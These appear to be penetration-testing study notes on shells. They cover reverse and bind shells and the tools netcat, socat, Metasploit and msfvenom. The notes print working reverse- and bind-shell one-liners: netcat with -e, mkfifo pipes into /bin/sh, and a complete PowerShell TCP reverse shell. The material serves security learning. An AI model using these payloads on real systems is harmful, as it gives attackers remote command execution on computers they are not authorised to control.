A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.  
In cyber security, it commonly refers to a specific shell session an attacker uses when accessing a compromised system, allowing them to run commands and execute software. This will allow attackers to execute several activities, some of which are described below.

- **Remote System Control**: allows the attacker to execute commands or software remotely in the target system.
- **Privilege Escalation**
- **Data Exfiltration**
- **Persistence and Maintenance Access**
- **Post-Exploitation Activities**
- **Access Other Systems on the Network** This is also known as pivoting.
There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:
### Netcat
Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.
### Socat
Socat is like netcat on steroids. It can do all of the same things, and _many_ more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
### Metasploit -- multi/handler
The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a _meterpreter_ shell, and is the easiest way to handle _staged_ payloads
### Msfvenom
Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room.

### Other useful links
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
[PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
[SecLists](https://github.com/danielmiessler/SecLists)

## Types of Shells
### Reverse Shell
Are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools to set up a listener which is used to receive the connection. Reverse shells are a good way to bypass firewall rules, but the drawback is that, you need to configure your network to receive a shell across the internet.
On the attacking machine: `sudo nc -lvnp 443`
On the target: `nc <LOCAL-IP> <PORT> -e /bin/bash`
### Bind Shell
Are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.
On the target: `nc -lvnp <port> -e "cmd.exe"`
On the attacking machine: `nc MACHINE_IP <port>`

### Interactive vs Non-Interactive
#### Interactive
These allow you to interact with programs after executing them. For example, the SSH login prompt.
### Non-Interactive
In a non=interactive shell you are limited to using programs which do not require  user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive.

# Shell Payloads
`netcat-traditional` there is no `-e` option which allows you to execute a process on connection.
On linux we can use this code to create a listener for a bind shell:
`mkfifo /tmp/f; nc -lnvp <PORT> < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f`

The command first creates a _[named pipe](https://www.linuxjournal.com/article/2156)_ at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat connects the input of the listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr ouput steam into stdout, and sending stout itself into the input of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell:
`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell. It is, however, an extremely useful one-liner to keep on hand:

`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

